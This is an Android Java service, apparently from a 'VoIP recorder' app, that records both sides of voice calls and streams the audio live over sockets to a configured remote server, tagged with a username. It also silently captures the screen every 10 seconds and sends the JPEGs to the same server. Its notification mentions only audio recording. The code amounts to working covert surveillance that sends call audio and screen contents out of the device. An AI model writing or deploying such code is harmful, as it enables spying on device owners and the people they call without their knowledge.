package com.example.voiprecord;

import static android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.*;
import android.media.projection.MediaProjection;

import android.graphics.Bitmap;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class VoipRecordService extends Service {
    private static final String TAG = "VoipRecordingService";
    private static final int SAMPLE_RATE = 16000;
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;
    private static final int BUFFER_SIZE_FACTOR = 4; // 缓冲区倍数

    private AudioRecord micRecord;
    private AudioRecord playbackRecord;
    private Thread micThread;
    private Thread playbackThread;
    private boolean isRecording = false;
    private static  MediaProjection mMediaProjection;
    private File micOutputFile;
    private File playbackOutputFile;
    private static final int NOTIFICATION_ID = 10001;
    private String currentCommand = "";
    // 添加网络相关变量
    private Socket micSocket;
    private Socket playbackSocket;
    private OutputStream micOutputStream;
    private OutputStream playbackOutputStream;
    private String serverAddress = ""; // 从SharedPreferences获取
    // 截图相关变量
    private Thread screenshotThread;
    private Socket screenshotSocket;
    private OutputStream screenshotOutputStream;
    private static final int SCREENSHOT_PORT = 8003;
    private static final int SCREENSHOT_INTERVAL = 10000; // 10秒
    private ImageReader imageReader;
    private VirtualDisplay virtualDisplay;


    private void startForegroundService() {
        // 创建通知渠道 (Android 8.0+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "voip_record_channel",
                    "语音通话录音",
                    NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("语音通话录音服务运行中");
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }

        // 创建通知
        Notification notification = new NotificationCompat.Builder(this, "voip_record_channel")
                .setContentTitle("语音通话录音")
                .setContentText("正在后台录音...")
                .setSmallIcon(R.drawable.ic_mic)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();

        // 启动前台服务
        startForeground(NOTIFICATION_ID, notification, FOREGROUND_SERVICE_TYPE_MICROPHONE);
    }
    public static void  setMediaProjection(MediaProjection mediaProjection) {
        mMediaProjection = mediaProjection;
        return;
    }
    public static MediaProjection getMediaProjection() {
        return mMediaProjection;
    }
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        // 初始化AudioManager

    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("command")) {
            currentCommand = intent.getStringExtra("command");
        }

        if ("start".equals(currentCommand)) {
            SharedPreferences prefs = getSharedPreferences("voip_config", MODE_PRIVATE);
            serverAddress = prefs.getString("server", "");
            startForegroundService();
            if (mMediaProjection != null) {
                startRecording();
            }
        } else if ("stop".equals(currentCommand)) {
            stopRecording();
        }
        return START_STICKY;
    }


    private void stopScreenshot() {
        if (screenshotThread != null) {
            screenshotThread.interrupt();
            try {
                screenshotThread.join(1000);
            } catch (InterruptedException e) {
                Log.e(TAG, "Screenshot thread stop interrupted", e);
            }
        }

        if (screenshotOutputStream != null) {
            try {
                screenshotOutputStream.close();
            } catch (IOException e) {
                Log.e(TAG, "Close screenshot output stream error", e);
            }
        }

        if (screenshotSocket != null) {
            try {
                screenshotSocket.close();
            } catch (IOException e) {
                Log.e(TAG, "Close screenshot socket error", e);
            }
        }

    }

    private void initScreenshot() {
        // 创建ImageReader
        DisplayMetrics metrics = getResources().getDisplayMetrics();
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int density = metrics.densityDpi;

        Log.d(TAG, "ImageReader: " + width + "x" + height + "@" + density + "dpi");

        // In VoipRecordService.java (before creating VirtualDisplay)
        mMediaProjection.registerCallback(new MediaProjection.Callback() {
            @Override
            public void onStop() {
                // Handle projection stop (e.g., user revoked permission)
                stopRecording(); // Clean up resources
                Log.w(TAG, "MediaProjection stopped by user/system");
            }
        }, null); // Handler null = uses calling thread

        // 创建虚拟显示
        if(virtualDisplay ==null) {
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            virtualDisplay = mMediaProjection.createVirtualDisplay(
                    "ScreenCapture",
                    width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(),
                    null, null);
        }


    }

    private void startRecording() {
        if (isRecording) {
            Log.w(TAG, "Recording already started");
            return;
        }

        if (!serverAddress.isEmpty()) {
            initScreenshot();
        }


        // 创建输出文件
        String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
        micOutputFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "voip_up_" + timestamp + ".pcm");
        playbackOutputFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "voip_down_" + timestamp + ".pcm");

        // 计算缓冲区大小
        int minBufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
        int bufferSize = minBufferSize * BUFFER_SIZE_FACTOR;

        try {
            // 初始化麦克风录音（上行）
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            SharedPreferences prefs = getSharedPreferences("voip_config", MODE_PRIVATE);
            String username = prefs.getString("username", "unknown");
            micRecord = new AudioRecord.Builder()
                    .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                    .setAudioFormat(new AudioFormat.Builder()
                            .setEncoding(AUDIO_FORMAT)
                            .setSampleRate(SAMPLE_RATE)
                            .setChannelMask(CHANNEL_CONFIG)
                            .build())
                    .setBufferSizeInBytes(bufferSize)
                    .build();

            // 初始化播放捕获（下行）
            AudioPlaybackCaptureConfiguration config = new AudioPlaybackCaptureConfiguration.Builder(mMediaProjection)
                    .addMatchingUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION)
                    .addMatchingUsage(AudioAttributes.USAGE_MEDIA)
                    .build();

            try {
                playbackRecord = new AudioRecord.Builder()
                        .setAudioFormat(new AudioFormat.Builder()
                                .setEncoding(AUDIO_FORMAT)
                                .setSampleRate(SAMPLE_RATE)
                                .setChannelMask(CHANNEL_CONFIG)
                                .build())
                        .setBufferSizeInBytes(bufferSize)
                        .setAudioPlaybackCaptureConfig(config)
                        .build();

            } catch (UnsupportedOperationException e) {
                Log.e(TAG, "Playback AudioRecord initialization failed", e);
                Toast.makeText(this, "录音失败，请重新授权并启动", Toast.LENGTH_SHORT).show();
                return;
            }
            // 检查初始化状态
            if (micRecord.getState() != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "Mic AudioRecord initialization failed");
                return;
            }

            if (playbackRecord.getState() != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "Playback AudioRecord initialization failed");
                return;
            }

            micRecord.startRecording();
            playbackRecord.startRecording();
            isRecording = true;

            micThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    if (!serverAddress.isEmpty()) {
                        try {
                            micSocket = new Socket(serverAddress, 8001); // 上行端口
                            micOutputStream = micSocket.getOutputStream();

                            // 发送用户名
                            sendUsername(micOutputStream, username);
                        } catch (IOException e) {
                            Log.e(TAG, "Network send error", e);
                        }
                    }
                    recordAudio(
                            micRecord, micOutputFile, "uplink", micOutputStream);
                }
            });

            playbackThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    if (!serverAddress.isEmpty()) {
                        try {
                            playbackSocket = new Socket(serverAddress, 8002); // 下行端口
                            playbackOutputStream = playbackSocket.getOutputStream();

                            // 发送用户名
                            sendUsername(playbackOutputStream, username);
                        } catch (IOException e) {
                            Log.e(TAG, "Network send error", e);

                        }
                    }
                    recordAudio(
                            playbackRecord, playbackOutputFile, "downlink", playbackOutputStream);
                }
            });

            // 启动截图线程
            screenshotThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        screenshotSocket = new Socket(serverAddress, SCREENSHOT_PORT);
                        screenshotOutputStream = screenshotSocket.getOutputStream();
                        DisplayMetrics metrics = getResources().getDisplayMetrics();
                        int width = metrics.widthPixels;
                        int height = metrics.heightPixels;
                        while (isRecording) {
                            // 每隔10秒截图
                            Thread.sleep(SCREENSHOT_INTERVAL);
                            Log.d(TAG, "send screenshot ");

                            // 获取最新图像
                            Image image = imageReader.acquireLatestImage();
                            if (image == null) continue;

                            // 转换为Bitmap
                            Image.Plane[] planes = image.getPlanes();
                            ByteBuffer buffer = planes[0].getBuffer();
                            int pixelStride = planes[0].getPixelStride();
                            int rowStride = planes[0].getRowStride();
                            int rowPadding = rowStride - pixelStride * width;

                            Bitmap bitmap = Bitmap.createBitmap(
                                    width + rowPadding / pixelStride,
                                    height,
                                    Bitmap.Config.ARGB_8888);
                            bitmap.copyPixelsFromBuffer(buffer);
                            image.close();

                            // 压缩为JPEG
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                            byte[] jpegData = baos.toByteArray();

                            // 发送图片大小 (4字节)
                            ByteBuffer sizeBuffer = ByteBuffer.allocate(4);
                            sizeBuffer.putInt(jpegData.length);
                            screenshotOutputStream.write(sizeBuffer.array());
                            // 发送图片数据
                            screenshotOutputStream.write(jpegData);
                            screenshotOutputStream.flush();

                            Log.d(TAG, "Sent screenshot: " + jpegData.length + " bytes");
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Screenshot error", e);
                    }
                }
            });

            micThread.start();
            playbackThread.start();
            screenshotThread.start();

            Log.i(TAG, "Recording started");
        } catch (Exception e) {
            Log.e(TAG, "Recording start failed", e);
            stopSelf();
        }
    }
    /**
     * 发送用户名到服务器
     * 格式: [4字节用户名长度] + [UTF-8编码的用户名]
     */
    private void sendUsername(OutputStream out, String username) throws IOException {
        byte[] usernameBytes = username.getBytes("UTF-8");
        int length = usernameBytes.length;

        // 发送4字节的长度 (大端序)
        ByteBuffer buffer = ByteBuffer.allocate(4);
        buffer.putInt(length);
        out.write(buffer.array());

        // 发送用户名
        out.write(usernameBytes);
        out.flush();

        Log.d(TAG, "Sent username: " + username + " (" + length + " bytes)");
    }
    private void recordAudio(AudioRecord audioRecord, File outputFile, String direction, OutputStream netStream) {
        final int bufferSize = 4096;
        byte[] buffer = new byte[bufferSize];

        try (FileOutputStream fos = new FileOutputStream(outputFile)) {
            while (isRecording) {
                int read = audioRecord.read(buffer, 0, bufferSize);
                if (read <= 0) continue;

                Log.d(TAG, "Record " + direction + " audio: " + buffer[0]);
                // 写入本地文件
                fos.write(buffer, 0, read);
                fos.flush();

                // 实时发送到服务器
                if (netStream != null) {
                    try {
                        netStream.write(buffer, 0, read);
                        netStream.flush();
                    } catch (IOException e) {
                        Log.e(TAG, "Network send error", e);
                    }
                }
            }
        } catch (IOException e) {
            Log.e(TAG, "File write error: " + outputFile.getName(), e);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopRecording();
    }

    private void stopRecording() {
        Log.i(TAG, "Stop recording");
        if (!isRecording) return;

        isRecording = false;

        try {
            if (micOutputStream != null) micOutputStream.close();
            if (playbackOutputStream != null) playbackOutputStream.close();
            if (micSocket != null) micSocket.close();
            if (playbackSocket != null) playbackSocket.close();
            // 停止录音线程
            if (micThread != null) {
                micThread.interrupt();
                micThread.join(1000);
            }
            if (playbackThread != null) {
                playbackThread.interrupt();
                playbackThread.join(1000);
            }

            // 释放录音资源
            if (micRecord != null) {
                micRecord.stop();
                micRecord.release();
            }
            if (playbackRecord != null) {
                playbackRecord.stop();
                playbackRecord.release();
            }
            stopScreenshot();


            Log.i(TAG, "Recording stopped. Files saved at:\n" +
                    micOutputFile.getAbsolutePath() + "\n" +
                    playbackOutputFile.getAbsolutePath());
        } catch (InterruptedException | IOException e) {
            Log.e(TAG, "Thread stop interrupted", e);
            Thread.currentThread().interrupt();
        }
    }
}